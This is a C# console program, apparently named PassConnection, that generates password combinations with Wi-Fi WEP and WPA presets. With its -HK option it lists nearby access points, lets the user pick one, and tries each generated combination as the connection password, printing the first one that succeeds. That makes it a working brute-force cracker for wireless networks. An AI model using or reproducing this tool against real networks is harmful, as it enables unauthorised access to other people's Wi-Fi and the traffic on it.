using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Numerics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UPUni.Events;
using UPUni.StringsCombinations;
using WifiConnection;

namespace PassConnection
{
    internal class Program
    {
        private static Version Version = new Version(1, 0, 0);

        private static string Commands =
            @"=> COMMANDS
            -- CONSOLE ---
            -FL<file neme>          : name of your file. Example pass.txt. [default : pass_yyyyMMddHHmmss_<type>.txt]
            -DR<directory>          : name of destiny direcory. Example C:\\directory\\directory1\\directory2\\... [default : direcotory executable]
            -CD<1|0>                : create diretory. [default : 0]
            -LG<1|0>                : log yours combinations. [default : 0]
            -SV<1|0>                : save yours combinations in file. [default : 0]
            -HK<1|0>                : select SSID to test passwords. [default : 0]
            -- COMBINATIONS --
            -LM<limit comb>         : limit of combinations. [default : -1]
            -MI<minimum characters> : minimum of characters. [default : 3]
            -MX<maximum characters> : maximum of characters. [default : 3]
            -CU<1|0>                : characters upper. [default : 1]
            -CL<1|0>                : characters lower. [default : 1]
            -CN<1|0>                : characters numbers. [default : 1]
            -CS<1|0>                : characters specials. [default : 1]
            -AL<1|0>                : characters accents lower. [default : 1]
            -AU<1|0>                : characters accents upper. [default : 1]
            -CO<others characters>  : others characters. [default : null]
            -RC<characters>         : remove characters. [default : null]
            -TP<type>               : type of defaults configurations. [default : CUSTOM]
                => TYPES
                WEP    : default pass Wi-Fi WEP.
                WPA    : default pass Wi-Fi WPA-PSK/WPA2-PSK.
                CUSTOM : default custom.";

        private static List<Defaults> DefaultsList = new List<Defaults>() {
            new Defaults() {
                Type = "WEP",
                Name = "Wi-Fi WEP",
                Minimum = 8,
                Maximum = 16,
                Upper = true,
                Lower = true,
                Number = true,
                Special = true,
                AccentsLower = true,
                AccentsUpper = true,
                Others = null,
                Remove = null
            },
            new Defaults() {
                Type = "WPA",
                Name = "Wi-Fi Wi-Fi WPA-PSK/WPA2-PSK",
                Minimum = 8,
                Maximum = 63,
                Upper = true,
                Lower = true,
                Number = true,
                Special = true,
                AccentsLower = true,
                AccentsUpper = true,
                Others = null,
                Remove = null
            },
            new Defaults() {
                Type = "CUSTOM",
                Name = "CUSTOM",
                Minimum = 3,
                Maximum = 3,
                Upper = true,
                Lower = true,
                Number = true,
                Special = true,
                AccentsLower = true,
                AccentsUpper = true,
                Others = null,
                Remove = null
            },
        };

        private static Wifi Wifi { get; set; }
        private static AuthRequest AuthRequest { get; set; }
        private static AccessPoint SelectedAP { get; set; }
        private static int InitDelaySeconds = 10;
        private static bool LogCombinations = false;
        private static bool SaveCombinations = false;
        private static bool HackWifi = false;
        private static string FileCombinations = "";

        static void Main(string[] args)
        {
            //args = new string[] { "-TPWPA", "-LG1", "-SV0", "-MI8", "-MX8", "-RC´`~^/\\|(){}[]<>%-_=+?;:,.", "-AL0", "-AU0", "-HK1" };

            Console.WriteLine("PASSWORD COMBINATION GENERATOR V." + Version.ToString());
            Console.WriteLine("--------------------------------------------------------");
            Console.WriteLine(Commands);
            Console.WriteLine("--------------------------------------------------------");

            init:
            try
            {
                if (args == null || args.Length == 0)
                {
                    args = ErrorInvalid("COMMANDS");
                    goto init;
                }

                Defaults defaults = new Defaults();
                string type = GetCommandValue(args, "-TP", "CUSTOM");
                string file = GetCommandValue(args, "-FL", "pass_" + DateTime.Now.ToString("yyyyMMddHHmmss") + "_" + type + ".txt");
                string directory = GetCommandValue(args, "-DR", AppDomain.CurrentDomain.BaseDirectory.ToString());
                bool createDirecory = GetCommandValue(args, "-CD", "0").Equals("1");
                LogCombinations = GetCommandValue(args, "-LG", "0").Equals("1");
                SaveCombinations = GetCommandValue(args, "-SV", "0").Equals("1");
                int MaxCombinations = Convert.ToInt32(GetCommandValue(args, "-LM", "0"));
                HackWifi = GetCommandValue(args, "-HK", "0").Equals("1");

                bool isType = false;
                foreach (var item in DefaultsList)
                {
                    if (!item.Type.Contains(type))
                    {
                        defaults = item;
                        isType = true;
                        break;
                    }
                }

                if (!isType)
                {
                    args = ErrorInvalid("TYPE");
                    goto init;
                }


                if (createDirecory)
                {
                    if (!Directory.Exists(directory))
                    {
                        Directory.CreateDirectory(directory);
                    }
                }

                if (File.Exists(Path.Combine(directory, file)))
                {
                    args = ErrorInvalid("FILE");
                    goto init;
                }

                FileCombinations = Path.Combine(directory, file);

                if (defaults.Type.Equals("CUSTOM"))
                {
                    defaults.Minimum = Convert.ToInt32(GetCommandValue(args, "-MI", "3"));
                    defaults.Maximum = Convert.ToInt32(GetCommandValue(args, "-MX", "3"));
                    defaults.Upper = GetCommandValue(args, "-CU", "1").Equals("1");
                    defaults.Lower = GetCommandValue(args, "-CL", "1").Equals("1");
                    defaults.Number = GetCommandValue(args, "-CN", "1").Equals("1");
                    defaults.Special = GetCommandValue(args, "-CS", "1").Equals("1");
                    defaults.AccentsLower = GetCommandValue(args, "-AL", "1").Equals("1");
                    defaults.AccentsUpper = GetCommandValue(args, "-AU", "1").Equals("1");
                    defaults.Others = GetCommandValue(args, "-CO", null);
                    defaults.Remove = GetCommandValue(args, "-RC", null);
                }
                else
                {
                    defaults.Minimum = Convert.ToInt32(GetCommandValue(args, "-MI", defaults.Minimum.ToString()));
                    defaults.Maximum = Convert.ToInt32(GetCommandValue(args, "-MX", defaults.Maximum.ToString()));
                    defaults.Upper = GetCommandValue(args, "-CU", !defaults.Upper ? "0" : "1").Equals("1");
                    defaults.Lower = GetCommandValue(args, "-CL", !defaults.Lower ? "0" : "1").Equals("1");
                    defaults.Number = GetCommandValue(args, "-CN", !defaults.Number ? "0" : "1").Equals("1");
                    defaults.Special = GetCommandValue(args, "-CS", !defaults.Special ? "0" : "1").Equals("1");
                    defaults.AccentsLower = GetCommandValue(args, "-AL", !defaults.AccentsLower ? "0" : "1").Equals("1");
                    defaults.AccentsUpper = GetCommandValue(args, "-AU", !defaults.AccentsUpper ? "0" : "1").Equals("1");
                    defaults.Others = GetCommandValue(args, "-CO", defaults.Others);
                    defaults.Remove = GetCommandValue(args, "-RC", defaults.Remove);
                }

                if (HackWifi)
                {
                    Wifi = new Wifi();

                    if (Wifi.NoWifiAvailable)
                    {
                        args = ErrorInvalid("NO WIFI CARD WAS FOUND");
                        goto init;
                    }

                    Connect();
                    Console.WriteLine("--------------------------------------------------------");
                }

                Combinations combinations = new Combinations(defaults, MaxCombinations);
                combinations.GenerateCombinationsEvent += Combinations_GenerateCombinationsEvent;

                BigInteger totalCombinations = combinations.CalculateTotalCombinations();
                BigInteger totalBytes = combinations.CalculateTotalCombinationsBytes();
                string readableSize = combinations.ConvertBytesToReadableSize(totalBytes);

                DateTime dateIni = DateTime.Now.AddSeconds(InitDelaySeconds);

                Console.WriteLine("CREATIN YOUR COMBINATIONS AWAIT...");
                Console.WriteLine("\tTOTAL: " + totalCombinations + " COMBINATIONS");
                Console.WriteLine("\tBYTES: " + totalBytes);
                Console.WriteLine("\tSIZE: " + readableSize);
                Console.WriteLine("\tDATE: " + dateIni.ToString("dd/MM/yyyy HH:mm:ss"));
                Console.WriteLine("--------------------------------------------------------");

                for (int x = 0; x < InitDelaySeconds; x++)
                {
                    Console.Write(".");
                    Thread.Sleep(1000);
                }
                Console.Write(".");
                Console.WriteLine("\r");

                combinations.GenerateCombinations();

                Console.WriteLine("--------------------------------------------------------");
                Console.WriteLine("COMBINATIONS SUCCESSFULLY CREATED");
                Console.WriteLine("=> REPORT");
                Console.WriteLine("\tCREATED " + combinations.CombinationCount + " COMBINATIONS");
                Console.WriteLine("\tTIME " + (DateTime.Now - dateIni).ToString("dd/MM/yyyy HH:mm:ss"));
                Console.WriteLine("--------------------------------------------------------");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Console.WriteLine("--------------------------------------------------------");
                Console.Write(">");
                args = Console.ReadLine().Split(' ');
                goto init;
            }
            Console.ReadKey();
        }

        private static void Combinations_GenerateCombinationsEvent(object sender, GenerateCombinationsEventArgs e)
        {
            try
            {
                if (LogCombinations)
                {
                    Console.WriteLine("[" + e.CombinationCount + "] = " + e.CurrentCombinationStr);
                }

                if (SaveCombinations)
                {
                    SaveCombination(FileCombinations, e.CurrentCombinationStr);
                }

                if (HackWifi)
                {
                    bool validPassFormat = SelectedAP.IsValidPassword(e.CurrentCombinationStr);

                    AuthRequest.Password = e.CurrentCombinationStr;

                    if (validPassFormat)
                    {
                        bool ret = SelectedAP.Connect(AuthRequest, true);

                        if (ret)
                        {
                            e.Cancel = true;

                            Console.WriteLine("SUCCESS = " + e.CurrentCombinationStr);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        private static string[] ErrorInvalid(string msg)
        {
            Console.WriteLine("WARNING: INVALID " + msg + "! TRY AGAIN");
            Console.WriteLine("--------------------------------------------------------");
            Console.Write(">");
            return Console.ReadLine().Split(' ');
        }

        private static string GetCommandValue(string[] commands, string commandOption, string defaultValue)
        {
            string ret = defaultValue;

            foreach (var item in commands)
            {
                if (item.StartsWith(commandOption))
                {
                    ret = item.Substring(commandOption.Length);
                    break;
                }
            }

            return ret;
        }

        private static void SaveCombination(string file, string msg)
        {
            using (StreamWriter writer = new StreamWriter(file, true))
            {
                writer.WriteLine(msg);
            }
        }

        private static IEnumerable<AccessPoint> List()
        {
            Console.WriteLine("-- Access point list --");
            IEnumerable<AccessPoint> accessPoints = Wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);

            int i = 0;
            foreach (AccessPoint ap in accessPoints)
                Console.WriteLine("{0}. {1} {2}% Connected: {3}", i++, ap.Name, ap.SignalStrength, ap.IsConnected);

            return accessPoints;
        }


        private static void Connect()
        {
            var accessPoints = List();

            Console.Write("Enter the index of the network you wish to connect to: ");

            int selectedIndex = int.Parse(Console.ReadLine());
            if (selectedIndex > accessPoints.ToArray().Length || accessPoints.ToArray().Length == 0)
            {
                Console.Write("\r\nIndex out of bounds");
                return;
            }
            SelectedAP = accessPoints.ToList()[selectedIndex];

            // Auth
            AuthRequest = new AuthRequest(SelectedAP);

            if (AuthRequest.IsPasswordRequired)
            {
                if (AuthRequest.IsUsernameRequired)
                {
                    Console.Write("\r\nPlease enter a username: ");
                    AuthRequest.Username = Console.ReadLine();
                }

                if (AuthRequest.IsDomainSupported)
                {
                    Console.Write("\r\nPlease enter a domain: ");
                    AuthRequest.Domain = Console.ReadLine();
                }
            }
        }
    }
}
